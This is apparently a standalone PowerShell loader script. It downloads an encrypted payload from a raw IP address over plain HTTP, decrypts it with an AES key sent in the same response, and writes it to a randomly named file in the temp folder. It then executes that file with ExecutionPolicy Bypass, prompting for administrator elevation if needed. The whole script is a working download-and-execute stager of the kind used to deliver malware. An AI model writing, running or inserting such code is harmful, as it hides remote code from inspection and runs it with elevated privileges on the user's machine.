$ErrorActionPreference='Stop'
[Net.ServicePointManager]::SecurityProtocol='Tls12'
$r=Invoke-RestMethod -UseBasicParsing 'http://51.75.118.5:20216/s/tk-482913-a7f2c/install' -Headers @{'Cache-Control'='no-cache'}
$b=[Convert]::FromBase64String($r.c)
$a=[Security.Cryptography.Aes]::Create()
$a.Mode='CBC';$a.Padding='PKCS7'
$a.Key=[Convert]::FromBase64String($r.k)
$a.IV=[Convert]::FromBase64String($r.v)
$p=[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($b,0,$b.Length))
$m=[IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($p))
if((Get-FileHash -Algorithm SHA256 -InputStream $m).Hash -ne $r.h){throw 'bad payload'}
$t=Join-Path $env:TEMP ('s'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.ps1')
Set-Content $t $p -Encoding UTF8
$adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')
if($adm){& powershell -NoProfile -ExecutionPolicy Bypass -File $t}
else{Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$t)}
